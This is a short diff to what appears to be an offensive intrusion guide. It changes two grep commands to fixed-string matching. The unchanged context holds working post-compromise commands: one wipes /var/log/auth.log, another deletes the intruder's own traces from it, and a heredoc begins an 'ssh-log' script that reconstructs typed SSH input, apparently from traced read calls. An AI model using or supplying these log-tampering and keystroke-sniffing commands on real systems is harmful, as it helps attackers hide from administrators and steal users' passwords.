@@ -741,7 +741,7 @@ cat /dev/null >/var/log/auth.log
 This will remove any sign of us from the log file:
 ```sh
 cd /dev/shm
-grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
+grep -Fv 'thc.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
 ```
 
 <a id="shhu-anchor"></a>
@@ -889,7 +889,7 @@ __EOF__
 
 cat <<__EOF__ >~/.local/bin/ssh-log
 #! /bin/bash
-grep 'read(4' | cut -f2 -d\\" | while read -r x; do
+grep -F 'read(4' | cut -f2 -d\\" | while read -r x; do
         [[ \${#x} -gt 5 ]] && continue 
         [[ \${x} == +(\\\\n|\\\\r) ]] && { echo ""; continue; }
         echo -n "\${x}"
